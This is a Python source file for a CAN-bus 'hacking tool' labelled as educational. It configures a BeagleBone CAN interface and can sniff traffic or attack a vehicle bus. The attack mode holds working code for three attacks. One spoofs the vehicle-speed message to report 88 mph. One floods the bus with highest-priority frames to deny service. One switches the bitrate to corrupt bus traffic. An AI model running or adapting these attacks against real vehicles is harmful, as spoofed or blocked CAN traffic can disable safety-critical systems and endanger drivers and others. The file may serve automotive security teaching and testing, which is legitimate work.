#!/usr/bin/python
# CAN Hacking Tool developed by Larry Kozlowski
# Property of Rose-Hulman Institute of Technology and Rolls-Royce
#
# To be used as an education tool only and not for malicious intent

import datetime
import os
import can
import can.interfaces.interface as interface
import json
from time import sleep
from can import Message
from cht.data import transcode as trans

can.rc['interface'] = 'socketcan_ctypes'
PID_Data = json.load(open('data/PID.json'))


def main():
    global msg
    mode = 0  # 0 - Diagnostic, 1 - Attack

    # Attack Types
    rep = 0
    den = 1
    corrupt = 2

    # DOS Data
    den_id = 0
    den_dlc = 8
    den_data = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]
    den_sleep = 0.0001

    # ID-REP DATA
    rep_id = 0x0D  # Currently set to Vehicle Speed
    rep_data_decoded = 88  # Value is X mph
    rep_dlc = min(int(PID_Data[1][rep_id]["bytes"]), 8)
    rep_data_encoded = trans.encodeDataToPID(rep_id, rep_data_decoded)
    rep_sleep = 0.01  # Needs to send faster than the default node but not overload bus

    attack_type = rep

    # Setup CAN interface
    script = """
    sudo modprobe can
    sudo modprobe can-dev
    sudo modprobe can-raw
    sudo config-pin -a P8_13 GPIO
    sudo config-pin -a P8_13 out
    sudo config-pin -a P8_13 low
    sudo config-pin -a P9_26 can
    sudo config-pin -a P9_24 can
    sudo ip link set can1 up type can bitrate 250000 restart-ms 100
    ifconfig can1 up
    """
    os.system("bash -c '%s'" % script)
    can_interface = 'can1'
    bus = interface.Bus(can_interface)

    if mode == 0:
        try:
            while True:
                msg = bus.recv(0.0)
                if msg:
                    check_rx(msg.arbitration_id, msg.data[0])
        except KeyboardInterrupt:
            bus.shutdown()
    elif mode == 1:
        if attack_type == rep:
            msg = Message(arbitration_id=rep_id,
                          dlc=rep_dlc,
                          data=rep_data_encoded,
                          extended_id=False)
        elif attack_type == den:
            msg = Message(arbitration_id=den_id,
                          dlc=den_dlc,
                          data=den_data,
                          extended_id=False)
        elif attack_type == corrupt:
            msg = Message(arbitration_id=den_id,
                          dlc=den_dlc,
                          data=den_data,
                          extended_id=False)
        else:
            print("Incorrect Attack Type")
            exit()
        if attack_type != corrupt:
            while True:
                try:
                    bus.send(msg)
                    if attack_type == rep:
                        sleep(rep_sleep)
                    elif attack_type == den:
                        sleep(den_sleep)
                except:
                    print("Something went wrong! - bus.send(msg)")
                    exit()
        elif attack_type == corrupt:
            corrupt_script = '''
            sudo ifconfig can1 down
            sudo ip link set can1 up type can bitrate 800000
            '''
            os.system("bash -c '%s'" % corrupt_script)
            # noinspection PyBroadException
            try:
                while True:
                    bus.send(msg)
            except:
                print("Exception encountered in Corrupt stage")
                exit()
        else:
            print("Incorrect Mode")
            exit()


def check_rx(pid, data):
    now = datetime.datetime.now()
    time_string = now.strftime("%d.%m.%Y %H:%M:%S ")
    decode = trans.decodeDataFromPID(pid, data)
    print(time_string, " ID ", pid, " Data ", data, " Decoded ", decode)


if __name__ == "__main__":
    main()
